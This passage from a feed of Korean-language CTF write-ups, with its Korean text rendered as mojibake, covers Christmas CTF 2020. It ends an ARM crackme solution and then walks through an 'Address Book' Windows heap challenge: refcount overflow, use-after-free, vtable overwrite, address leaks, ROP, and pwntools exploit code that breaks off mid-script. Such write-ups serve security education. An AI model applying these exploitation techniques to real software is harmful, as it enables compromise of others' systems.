class="hljs-attribute">c1c</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">c20</span>:   <span class="hljs-number">91000800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">2</span> <span class="hljs-attribute">c24</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c28</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">c2c</span>:   <span class="hljs-number">91000800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">2</span> <span class="hljs-attribute">c30</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c34</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">c38</span>:   <span class="hljs-number">54000081</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">c3c</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">c40</span>:   <span class="hljs-number">97</span>ffffab    bl  aec &lt;sub_aec&gt; <span class="hljs-attribute">c44</span>:   d<span class="hljs-number">503201</span>f    nop <span class="hljs-attribute">c48</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">27</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #32</span><span class="hljs-meta"> c4c:   d65f03c0    ret</span></code></pre><p>ìœ„ì—ì„œ ë³µí˜¸í™”í•œ <code>[a-zA-Z0-9]</code> ê°’ê³¼ ì…ë ¥ ê°’ì„ í†µí•´ í•˜ë‚˜ì”© ë¹„êµí•œ í›„ ì¡°ê±´ì´ ëª¨ë‘ ë§ìœ¼ë©´ <code>x0</code>ì—  input ê°’ì„ ë„£ê³  <code>sub_aec</code>ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. ê°’ì„ ë¹„êµí•˜ëŠ” ë¶€ë¶„ì„ ê°„ë‹¨í•˜ê²Œ ì •ë¦¬í•˜ë©´ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><ul><li>var1[0x6] == var2[0xe]</li><li>var1[0x4] == var2[0x3]</li><li>var1[0x3] == var2[0xa]</li><li>var1[0x7] == var2[0x11]</li><li>var1[0x1] == var2[0xe]</li><li>var1[0x5] == var2[0x34]</li><li>var1[0x0] == var2[0x35]</li><li>var1[0x2] == var2[0x2]</li></ul><p>ìˆœì„œì— ë§ì¶°ì„œ ë°°ì—´í•˜ë©´ input ê°’ì„ êµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs python">user_input = <span class="hljs-string">&quot;&quot;</span>user_input += result[<span class="hljs-number">0x35</span>] + result[<span class="hljs-number">0xe</span>] + result[<span class="hljs-number">0x2</span>] + result[<span class="hljs-number">0xa</span>] + result[<span class="hljs-number">0x3</span>] +result[<span class="hljs-number">0x34</span>] + result[<span class="hljs-number">0xe</span>] + result[<span class="hljs-number">0x11</span>]print(user_input)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">C:\Users\idioth\Desktop&gt;lock.py</span><span class="hljs-string">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="hljs-string">1ockd0or</span><span class="hljs-string">&#x27;&#x27;&#x27;</span></code></pre><p>ì¡°ê±´ì´ ë§ëŠ” ì…ë ¥ ê°’ì„ ì¸ìë¡œ <code>sub_aec</code> ê°’ì„ í˜¸ì¶œí•˜ë‹ˆ í•´ë‹¹ í•¨ìˆ˜ë¥¼ í™•ì¸í•´ë³´ë©´ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs apache"><span class="hljs-attribute">value2</span>  DCB <span class="hljs-number">0</span>x<span class="hljs-number">69</span>, <span class="hljs-number">0</span>x<span class="hljs-number">22</span>, <span class="hljs-number">0</span>x<span class="hljs-number">22</span>, <span class="hljs-number">0</span>x<span class="hljs-number">38</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">43</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>C, <span class="hljs-number">0</span>x<span class="hljs-number">45</span>, <span class="hljs-number">0</span>xE, <span class="hljs-number">0</span>x<span class="hljs-number">3</span>C,<span class="hljs-attribute">0x8</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">30</span>, <span class="hljs-number">0</span>x<span class="hljs-number">17</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">3</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">44</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">17</span>,<span class="hljs-attribute">0x6E</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">53</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">17</span>, <span class="hljs-number">0</span>x<span class="hljs-number">55</span>, <span class="hljs-number">0</span>x<span class="hljs-number">12</span><span class="hljs-attribute">0000000000000aec</span> &lt;sub_aec&gt;: <span class="hljs-attribute">aec</span>:   a<span class="hljs-number">9</span>bd<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-48]!</span><span class="hljs-meta"> af0:   910003fd    mov x29, sp</span><span class="hljs-meta"> af4:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">af8</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">afc</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">29</span>    bl  <span class="hljs-number">7</span>a<span class="hljs-number">0</span> &lt;strlen@plt&gt; <span class="hljs-attribute">b00</span>:   <span class="hljs-number">2</span>a<span class="hljs-number">0003</span>e<span class="hljs-number">3</span>    mov w<span class="hljs-number">3</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b04</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">2</span>    ldr x<span class="hljs-number">2</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b08</span>:   <span class="hljs-number">528003</span>e<span class="hljs-number">1</span>    mov w<span class="hljs-number">1</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span>f Â  Â  Â  Â  Â  Â  Â  Â    // #<span class="hljs-number">31</span> <span class="hljs-attribute">b0c</span>:   <span class="hljs-number">90000000</span>    adrp    x<span class="hljs-number">0</span>, value<span class="hljs-number">2</span>@page <span class="hljs-attribute">b10</span>:   <span class="hljs-number">91382000</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, value<span class="hljs-number">2</span>@pageoff <span class="hljs-attribute">b14</span>:   <span class="hljs-number">97</span>ffffba    bl  <span class="hljs-number">9</span>fc &lt;sub_<span class="hljs-number">9</span>fc&gt; <span class="hljs-attribute">b18</span>:   f<span class="hljs-number">90017</span>e<span class="hljs-number">0</span>    str x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">b1c</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">b20</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">3</span>c    bl  <span class="hljs-number">810</span> &lt;puts@plt&gt; <span class="hljs-attribute">b24</span>:   d<span class="hljs-number">503201</span>f    nop <span class="hljs-attribute">b28</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">37</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #48</span><span class="hljs-meta"> b2c:   d65f03c0    ret</span></code></pre><p>ì…ë ¥ ê°’ê³¼ value2ë¥¼ ì¸ìë¡œ <code>sub_9fc</code>ë¥¼ ìˆ˜í–‰í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. <code>sub_9fc</code>ì˜ ê²½ìš° ì•„ê¹Œ python scriptë¥¼ ì§œ ë†“ì•˜ê¸° ë•Œë¬¸ì— ê·¸ëƒ¥ ê°’ì„ ì…ë ¥í•˜ì—¬ ì—°ì‚°í•˜ë©´ ë©ë‹ˆë‹¤.</p><pre><code class="hljs python">string3 = [ Â  Â <span class="hljs-number">0x69</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xE</span>, <span class="hljs-number">0x3C</span>,<span class="hljs-number">0x8</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x17</span>,<span class="hljs-number">0x6E</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x12</span>]flag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(string3)): Â  Â flag += chr(string3[i] ^ ord(user_input[i % len(user_input)]))print(flag)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">C:\Users\idioth\Desktop&gt;lock.py</span><span class="hljs-string">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="hljs-string">1ockd0or</span><span class="hljs-string">XMAS&#123;s4nta_can_enter_the_h0use&#125;</span><span class="hljs-string">&#x27;&#x27;&#x27;</span></code></pre><p>FLAG : XMAS{s4nta_can_enter_the_h0use}</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>christmas ctf 2020</tag>
      
      <tag>arm</tag>
      
      <tag>crackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - Address Book</title>
    <link href="/2020/12/29/l0ch/address_book/"/>
    <url>/2020/12/29/l0ch/address_book/</url>
    
    <content type="html"><![CDATA[<p>ì²˜ìŒìœ¼ë¡œ ë‚¸ Windows í™˜ê²½ì˜ ë¬¸ì œì…ë‹ˆë‹¤..! ëŒ€íšŒ ë‹¹ì¼ë‚  ì‹œì‘ê³¼ ë™ì‹œì— ê³µê°œëœ ë¬¸ì œì´ë‚˜ 12ì‹œê°„ì´ ë˜ë„ë¡ ì†”ë²„ê°€ ì•ˆë‚˜ì™€ì„œ solvableí•œ ë¬¸ì œê°€ ì•„ë‹Œê°€ ëŒ€íšŒ ë‚´ë‚´ ê±±ì •í–ˆë˜ ì¹œêµ¬ì´ê¸°ë„ í•˜ì£  ã… ã… </p><p>idiothí˜•ì´ ëŒ€íšŒ ì¤‘ê°„ì— 0ì†”ë²„ë¥¼ ìœ„í•œ ì„ ë¬¼ì´ë¼ê³  ì§¤ì„ í•˜ë‚˜ ë³´ë‚´ì¤¬ëŠ”ë°â€¦</p><p><img src="/2020/12/29/l0ch/address_book/1.png"></p><blockquote><p>ì¦Œì¯”â€¦ ëŠë¯€ ê·¸ë¯‘ëŠâ€¦^^</p></blockquote><p>ê·¸ë˜ë„ ëŒ€íšŒ 12ì‹œê°„ë§Œì— ë‹¤í–‰íˆ ì†”ë²„ê°€ ë‚˜ì™€ì„œ ë‹¤í–‰ì´ë¼ê³  ìƒê°í•©ë‹ˆë‹¤ ã…ã….</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>ë¨¼ì €, ë¬¸ì œ í™˜ê²½ë¶€í„° ë³´ì‹œì£ </p><blockquote><p>Windows 64bit Version 10.0.19041.264 ASLR: True DEP: True SafeSEH: True Stack Cookie: True</p></blockquote><p>64bit ìœˆë„ìš° 10 í™˜ê²½ì´ë©°, ë³´í˜¸ê¸°ë²•ì€ ëª¨ë‘ ê±¸ë ¤ìˆë„¤ìš”!</p><p>ì–´ë–¤ ê¸°ëŠ¥ë“¤ì´ ìˆëŠ”ì§€ ë³´ê² ìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/29/l0ch/address_book/2.png"></p><ol><li><p>Add address Info</p><p>name, address, cityë¥¼ ì…ë ¥ë°›ê³  address infoë¥¼ ì¶”ê°€</p></li><li><p>Address Info List</p><p>ì¶”ê°€í•œ address infoë“¤ì„ ì¶œë ¥</p></li><li><p>Delete address Info</p><p>address infoë¥¼ ì‚­ì œ. ì´ ë•Œ ì‚­ì œëœ infoëŠ” Recycle Bin Listì— ì¶”ê°€</p></li><li><p>Restore address Info</p><p>ì‚­ì œëœ infoë¥¼ ì›ë˜ Listë¡œ ë³µêµ¬</p></li><li><p>Modify address Info</p><p>ìˆ˜ì •í•  address infoë¥¼ ì„ íƒí•´ name, address, cityë¥¼ ìˆ˜ì • ê°€ëŠ¥</p></li><li><p>Empty List</p><p>address listì™€ recycle bin list í•­ëª©ì„ ëª¨ë‘ ì‚­ì œ</p></li><li><p>Exit</p></li></ol><p>7ë²ˆìœ¼ë¡œ ì¢…ë£Œí•˜ë©´</p><p><img src="/2020/12/29/l0ch/address_book/3.png"></p><p>listê°€ ì €ì¥ë˜ì—ˆë‹¤ê³  ëœ¨ëŠ”ë°, ì˜†ì— ë©”ëª¨ë¦¬ ì£¼ì†Œë¡œ ë³´ì´ëŠ” ê°’ì´ ì¡´ì¬í•©ë‹ˆë‹¤.</p><p>ë¦¬ìŠ¤íŠ¸ëŠ” double linked listë¡œ êµ¬í˜„ë˜ì–´ ìˆìœ¼ë©° ì²˜ìŒì— <code>Address Book</code>, <code>Recycle Bin</code> ë‘ê°œì˜ ê°ì²´ê°€ í• ë‹¹ë˜ì–´ ê°ê° 2byte ì •ìˆ˜ typeì˜ reference count (ì´ˆê¸°ê°’=10)ë¥¼ ê°€ì§‘ë‹ˆë‹¤. í•¨ìˆ˜ê°€ ê°ì²´ë¥¼ ì°¸ì¡°í•  ë•Œ countê°€ 10 ì˜¬ë¼ê°€ë©° í•´ë‹¹ í•¨ìˆ˜ë¥¼ ë¹ ì ¸ë‚˜ì˜¬ë•Œ countê°€ 10 ê°ì†Œí•˜ê³  10ë³´ë‹¤ ì‘ìœ¼ë©´ í• ë‹¹ëœ ê°ì²´ë¥¼ freeí•˜ê³  ê°ì²´ì˜ ì£¼ì†Œë¥¼ ì¶œë ¥í•©ë‹ˆë‹¤.</p><p>ê°ì´ ì˜¤ì‹œì£ . C++ì˜ ê³µìœ í¬ì¸í„° <code>std::shared_ptr</code> ë¥¼ ì»¤ìŠ¤í…€ êµ¬í˜„í•œ ë¬¸ì œì…ë‹ˆë‹¤.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p><code>Recycle Bin</code>ì˜ infoë¥¼ restoreí• ë•Œ ë³µêµ¬í•˜ëŠ” ë…¸ë“œì—ì„œ, <code>Recycle Bin</code>ì—ì„œ ì‚¬ìš©í•œ next ê°’ì´ ì´ˆê¸°í™”ë˜ì§€ ì•Šê³  ë‚¨ì•„ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/29/l0ch/address_book/4.png"><br>ë…¸ë“œë¥¼ ë„¤ ê°œ ìƒì„±í•œ ë’¤ 4, 3ì„ ì°¨ë¡€ëŒ€ë¡œ ì‚­ì œí•˜ë©´ Recycle Bin ë¦¬ìŠ¤íŠ¸ì— ìˆœì„œëŒ€ë¡œ ë“¤ì–´ê°‘ë‹ˆë‹¤.</p><p><img src="/2020/12/29/l0ch/address_book/5.png"></p><p>Restore 4ë¡œ <code>Address List</code>ë¡œ ë³µêµ¬í–ˆì„ë•Œ node 4ì˜ next ê°€ ì´ˆê¸°í™”ë˜ì§€ ì•Šê³  ì—¬ì „íˆ <code>Recycle Bin</code>ì˜ 3ì„ ê°€ë¦¬í‚µë‹ˆë‹¤.</p><p><img src="/2020/12/29/l0ch/address_book/6.png"></p><p>Restore 3ì„ í•˜ë©´ <code>Address List</code>ì— index ìˆœì„œì— ë§ê²Œ 2ì™€ 4 ì‚¬ì´ì— ì‚½ì…ë˜ê³  ê²°ê³¼ì ìœ¼ë¡œ ë‹¤ìŒê³¼ ê°™ì´ 3ê³¼ 4ì˜ nextê°€ ê°ê° ì„œë¡œë¥¼ ê°€ë¦¬í‚¤ê²Œ ë˜ì–´ ìˆœí™˜ì ì¸ êµ¬ì¡°ë¥¼ ê°€ì§„ ë¦¬ìŠ¤íŠ¸ë¥¼ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><code>Address List</code>ì˜ ë…¸ë“œë“¤ì„ ì¶œë ¥í•˜ëŠ” í•¨ìˆ˜ëŠ” ë…¸ë“œì˜ nextê°€ NULLì¼ë•Œê¹Œì§€ í˜¹ì€ ì…ë ¥í•œ ìˆ˜ë§Œí¼ ì¬ê·€í˜¸ì¶œì„ í†µí•´ head ë…¸ë“œë¶€í„° ì¶œë ¥í•©ë‹ˆë‹¤. ì´ë•Œ ì…ë ¥í•œ ìˆ˜ë¥¼ ê²€ì¦í•˜ì§€ ì•Šì•„ reference counterì˜  integer overflowê°€ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/29/l0ch/address_book/7.png"><br>ì¬ê·€í•¨ìˆ˜ì˜ ì¸ìë¡œ <code>Address List</code>ì˜ í¬ì¸í„°ê°€ ë“¤ì–´ê°€ëŠ”ë°, ì¬ê·€í•¨ìˆ˜ê°€ í•œ ë²ˆ í˜¸ì¶œë ë•Œë§ˆë‹¤ <code>Address List</code>ì˜ reference countê°€ 10ì”© ì¦ê°€í•©ë‹ˆë‹¤. </p><p>ìœ„ì™€ ê°™ì´ ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í–ˆì„ ë•Œ ì •í™•íˆ 3275ë§Œí¼ ì¬ê·€ë¡œ ì°¸ì¡°í•˜ë©´ 2byte ì •ìˆ˜ ì¡°ê±´ì„ ë²—ì–´ë‚˜ê²Œ ë˜ì–´ free ì¡°ê±´ì¸ <code>reference count &lt; 10</code> ì„ ë§Œì¡±í•˜ê²Œ ë˜ê³  AddressBook í¬ì¸í„°ê°€ í•œ ë²ˆ freeë©ë‹ˆë‹¤.  </p><p>ì´ì–´ Add Address Infoì—ì„œ ë…¸ë“œë¥¼ ìƒˆë¡œ í• ë‹¹í•˜ëŠ” ê²ƒìœ¼ë¡œ UAFë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆì–´ Address Infoì—ì„œ <code>name</code> ìœ¼ë¡œ vtable ì„ overwrite í•´ eip controlì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>ë°”ì´ë„ˆë¦¬ì—ì„œ <code>flag.txt</code>ë¥¼ opení–ˆìœ¼ë‹ˆ <code>read</code>ì™€ <code>write</code>ë¡œ flag ë‚´ìš©ì„ ì¶œë ¥í•˜ê¸°ë§Œ í•˜ë©´ ë©ë‹ˆë‹¤.</p><pre><code class="hljs c">read(<span class="hljs-number">3</span>, buffer, <span class="hljs-keyword">sizeof</span>(flag))  <span class="hljs-comment">// 3 : file descriptor</span>write(<span class="hljs-number">1</span>, buffer, <span class="hljs-keyword">sizeof</span>(flag))</code></pre><p>ROPì— í•„ìš”í•œ ê±´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><p><code>ntdll.dll</code> base address â†’ gadget</p><p><code>ucrtbase.dll</code> base address â†’ <code>read</code>, <code>write</code></p><p>ìœ„ ì£¼ì†Œë“¤ì„ êµ¬í•˜ê¸° ìœ„í•´ì„œ ë¨¼ì € ë°”ì´ë„ˆë¦¬ì˜ imagebaseë¶€í„° leakí•´ì•¼ í•©ë‹ˆë‹¤.</p><p>UAF ì´í›„ leakì€ Address Infoë¥¼ ì¶œë ¥í•  ë•Œ <code>head</code> í¬ì¸í„° ê°’ì—ì„œë¶€í„° ì°¸ì¡°í•˜ëŠ” ê²ƒì„ ì´ìš©í•´ Address Infoì˜ <code>city+16</code> ì—ì„œ <code>head</code> í¬ì¸í„°ë¥¼ overwrite â†’ OOB readê°€ ê°€ëŠ¥í•œ ì ì„ ì´ìš©í•©ë‹ˆë‹¤.</p><p><img src="/2020/12/29/l0ch/address_book/8.png"></p><p>ëª‡ë²ˆ ì‹¤í–‰í•´ë³´ë©´ ê°ì²´ê°„ offset ì— íŒ¨í„´ì´ ìˆìŠµë‹ˆë‹¤. offsetì„ ê³„ì‚°í•´ì„œ city+16 ì— Recycle Binì˜ ì£¼ì†Œë¡œ head ë¥¼ overwriteí•˜ê³  2ë²ˆ ë©”ë‰´ë¡œ ì¶œë ¥í•˜ë©´ vtable ì£¼ì†Œë¥¼ êµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/29/l0ch/address_book/9.png"></p><p><code>Recycle Bin</code>ì˜ vtable offsetì€ 0x6960ì´ë‹ˆ leakí•œ vtableì— offsetë§Œí¼ ë¹¼ë©´ imagebaseê°€ ë‚˜ì˜¤ê² êµ°ìš”!</p><p>ì´ì œ imagebaseë¥¼ êµ¬í–ˆìœ¼ë‹ˆ dll ì£¼ì†Œë¥¼ êµ¬í•˜ëŠ”ê±´ ì‰½ìŠµë‹ˆë‹¤!</p><p>êµ¬í•˜ê³ ì‹¶ì€ dllì˜ ì•„ë¬´ í•¨ìˆ˜ë‚˜ IAT í…Œì´ë¸”ì—ì„œ offsetì„ ì°¾ê³ , imagebase+offset ì£¼ì†Œì— ì¡´ì¬í•˜ëŠ” dll í•¨ìˆ˜ ì£¼ì†Œë¥¼ leakí•˜ë©´ ë˜ì£ . <code>ntdll</code>ë¶€í„° êµ¬í•´ë³´ê² ìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/29/l0ch/address_book/10.png"></p><p><code>!dh imagebase</code> ë¡œ IAT offsetì„ ì°¾ê³  Importëœ dll í•¨ìˆ˜ë¥¼ ì°¾ì•„ë³¼ê²Œìš”</p><p><img src="/2020/12/29/l0ch/address_book/11.png"></p><p><code>ntdll!RtlInitializeSListHead</code> ê°€ imagebase+ 0x6060ì— ìˆë„¤ìš”.</p><p><code>ucrtbase!free</code> ë„ imagebase + 0x61f0 ì¸ê±¸ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>vtableì„ leakí–ˆì„ ë•Œì™€ ê°™ì€ ë°©ë²•ìœ¼ë¡œ <code>head</code>ë¥¼ overwriteí•´ í•´ë‹¹ ë©”ëª¨ë¦¬ì— ìˆëŠ” ê°’ì„ ì¶œë ¥í•˜ê³  ê°ê° dll ë‚´ offsetì„ ë¹¼ì£¼ë©´ dll base addressë¥¼ êµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤!</p><h2 id="imagebase-dll-leak"><a href="#imagebase-dll-leak" class="headerlink" title="imagebase/dll leak"></a>imagebase/dll leak</h2><pre><code class="hljs python"><span class="hljs-comment"># ì „ì²´ ì½”ë“œëŠ” ì•„ë˜ Exploit Code ì°¸ì¡°</span><span class="hljs-comment"># get heap address</span>p.recvuntil(<span class="hljs-string">&quot;saved in &quot;</span>)obj_leak = int(p.recvuntil(<span class="hljs-string">&quot;\\r\\n&quot;</span>),<span class="hljs-number">16</span>)print(obj_leak)<span class="hljs-comment"># allocation after addressbook free</span><span class="hljs-comment"># overwrite addressbook-&gt;head to recyclebin, get recyclebin&#x27;s vtable</span><span class="hljs-comment"># not reliable leak, but address not changed before reboot</span>context.log_level = <span class="hljs-string">&quot;debug&quot;</span>addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span> + p64(obj_leak+<span class="hljs-number">0x250</span>))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)leak = p.recv(<span class="hljs-number">6</span>)<span class="hljs-keyword">if</span> leak[<span class="hljs-number">5</span>] != <span class="hljs-string">&quot;\\x7f&quot;</span>:print(<span class="hljs-string">&quot;vtable address not leaked&quot;</span>)exit()leak = u64(leak+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>)imagebase = leak - <span class="hljs-number">0x6960</span>ntdll_rtlinit = imagebase + <span class="hljs-number">0x6060</span>ucrtbase_free = imagebase + <span class="hljs-number">0x61f0</span><span class="hljs-comment"># leak ntdll</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ntdll_rtlinit))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ntdll = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0x6f270</span><span class="hljs-comment"># leak ucrtbase</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ucrtbase_free))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ucrtbase = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0xe940</span>print(<span class="hljs-string">&quot;image base : &quot;</span>+hex(imagebase))print(<span class="hljs-string">&quot;ntdll base : &quot;</span>+hex(ntdll))print(<span class="hljs-string">&quot;ucrtbase base : &quot;</span>+hex(ucrtbase))p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>)</code></pre><p><img src="/2020/12/29/l0ch/address_book/12.png"></p><p>ì´ì œ í•„ìš”í•œ ì£¼ì†Œë“¤ë„ ëª¨ë‘ êµ¬í–ˆê³  eipë„ ì»¨íŠ¸ë¡¤í•  ìˆ˜ ìˆìœ¼ë‹ˆ, ROP chainë§Œ êµ¬ì„±í•˜ë©´ ë©ë‹ˆë‹¤.</p><p><code>mov rsp, [rcx+152]; mov rcx, [rcx+248]; jmp rcx;</code> ë¡œ rspë¥¼ í˜„ì¬ í˜ì´ë¡œë“œê°€ ì˜¬ë¼ì™€ ìˆëŠ” ì£¼ì†Œë¡œ pivot í•œë’¤ <code>read</code>, <code>write</code>ë¥¼ ì°¨ë¡€ë¡œ í˜¸ì¶œí•˜ë©´ flagë¥¼ ì¶œë ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤!</p><p><img src="/2020/12/29/l0ch/address_book/13.png"></p><h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addAddr</span>(<span class="hljs-params">name, address, city</span>):</span>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)print(p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>))p.sendline(name)print(p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>))p.sendline(address)print(p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>))p.sendline(city)print(p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">listAddr</span>(<span class="hljs-params">idx</span>):</span>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)print(p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>))p.sendline(str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deleteAddr</span>(<span class="hljs-params">idx</span>):</span>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)print(p.recvuntil(<span 